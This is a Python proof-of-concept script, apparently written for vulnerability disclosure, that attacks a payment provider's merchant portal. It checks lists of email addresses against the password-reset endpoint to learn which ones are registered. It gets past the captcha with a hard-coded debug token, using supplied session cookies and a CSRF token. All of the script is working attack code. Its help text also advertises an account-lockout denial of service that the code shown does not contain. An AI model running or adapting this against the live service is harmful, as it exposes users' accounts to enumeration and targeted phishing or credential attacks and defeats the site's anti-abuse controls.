#!/usr/bin/env python3
import argparse
import json
import sys
import time

import requests


BASE_URL = "https://global.alipay.com"

#  captcha bypass: "dummy_token" is accepted as a valid captcha token
CAPTCHA_BYPASS_TOKEN = "dummy_token"
DUMMY_BIZ_NO = "a" * 64

HEADERS = {
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/144.0.0.0 Safari/537.36"
    ),
    "Accept": "application/json",
    "Content-Type": "application/json;charset=UTF-8",
    "Accept-Language": "en-US,en;q=0.9",
    "Sec-Ch-Ua": '"Not(A:Brand";v="8", "Chromium";v="144"',
    "Sec-Ch-Ua-Platform": '"Windows"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Bx-V": "2.5.36",
    "Origin": BASE_URL,
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": f"{BASE_URL}/merchant/portal/account/forget?_route=QK",
}

def check_email(sess: requests.Session, email: str, ctoken: str,
                route: str) -> dict:
    """Check if an email is registered. Uses the captcha bypass token."""
    url = (f"{BASE_URL}/merchant/proxyapi/member/checkEmail.json"
           f"?_route={route}&ctoken={ctoken}")
    headers = {**HEADERS, "Ctoken": ctoken}
    payload = {
        "email": email,
        "antCaptchaToken": CAPTCHA_BYPASS_TOKEN,
        "bizNo": DUMMY_BIZ_NO,
        "rdsAppId": f"imhome_resetLoginPwd_{route.lower()}",
    }
    resp = sess.post(url, json=payload, headers=headers, timeout=15)
    data = resp.json()

    registered = False
    if data.get("success") and data.get("data", {}).get("validated") is True:
        registered = True

    return {
        "email": email,
        "registered": registered,
        "resultCode": data.get("resultCode", ""),
        "resultMessage": data.get("resultMessage", ""),
        "raw": data,
    }

def main() -> None:
    p = argparse.ArgumentParser(
        description="PoC: Email Enumeration + Captcha Bypass + Account Lockout DoS",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Fully automated — no browser interaction required.
The captcha is bypassed using a debug token ("dummy_token").

Example:
  python3 %(prog)s --cookies cookies.json --emails "a@test.com" "b@test.com"
  python3 %(prog)s --cookies cookies.json --email-file targets.txt
""",
    )
    p.add_argument("--cookies", required=True,
                   help="Path to cookies JSON file")
    p.add_argument("--ctoken", default=None,
                   help="CSRF token (default: read from cookies.json)")
    p.add_argument("--route", default="QK")
    p.add_argument("--delay", type=float, default=0.3,
                   help="Delay between requests in seconds (default: 0.3)")

    email_group = p.add_mutually_exclusive_group(required=True)
    email_group.add_argument("--emails", nargs="+",
                             help="One or more emails to check")
    email_group.add_argument("--email-file",
                             help="File with one email per line")

    args = p.parse_args()

    try:
        with open(args.cookies) as f:
            cookies = json.load(f)
    except FileNotFoundError:
        try:
            cookies = json.loads(args.cookies)
        except json.JSONDecodeError:
            print(f"[!] Cannot read cookies: {args.cookies}")
            sys.exit(1)
    except json.JSONDecodeError:
        print(f"[!] Invalid JSON in {args.cookies}")
        sys.exit(1)

    ctoken = args.ctoken or cookies.get("ctoken", "")
    if not ctoken:
        print("[!] No ctoken found. Provide --ctoken or include it in cookies.json")
        sys.exit(1)

    # Build email list
    if args.email_file:
        with open(args.email_file) as f:
            emails = [line.strip() for line in f if line.strip()
                      and not line.startswith("#")]
    else:
        emails = args.emails

    print("=" * 70)
    print("PoC: Email Enumeration + Captcha Bypass")
    print(f"  Target         : {BASE_URL}")
    print(f"  Bypass token   : {CAPTCHA_BYPASS_TOKEN}")
    print(f"  Emails to check: {len(emails)}")
    print("=" * 70)
    print()

    registered = []
    not_registered = []
    errors = []

    for i, email in enumerate(emails, 1):
        sess = requests.Session()
        sess.cookies.update(cookies)

        result = check_email(sess, email, ctoken, args.route)

        if result["registered"]:
            tag = "REGISTERED"
            registered.append(email)
        elif result["resultCode"] == "IPAY_RS_510550101":
            tag = "NOT REGISTERED"
            not_registered.append(email)
        else:
            tag = f"ERROR ({result['resultCode']}: {result['resultMessage']})"
            errors.append(email)
            print(f"  Response: {json.dumps(result['raw'])}")

        print(f"[{i:03d}] {email:<50} {tag}")

        if i < len(emails):
            time.sleep(args.delay)

    # Summary
    print()
    print("=" * 70)
    print("SUMMARY")
    print("=" * 70)
    print(f"  Total checked  : {len(emails)}")
    print(f"  Registered     : {len(registered)}")
    print(f"  Not registered : {len(not_registered)}")
    print(f"  Errors         : {len(errors)}")

    if registered:
        print()
        print("  Registered emails:")
        for e in registered:
            print(f"    - {e}")

    print()
    print("-" * 70)
    print("VULNERABILITY DETAILS")
    print("-" * 70)


if __name__ == "__main__":
    main()
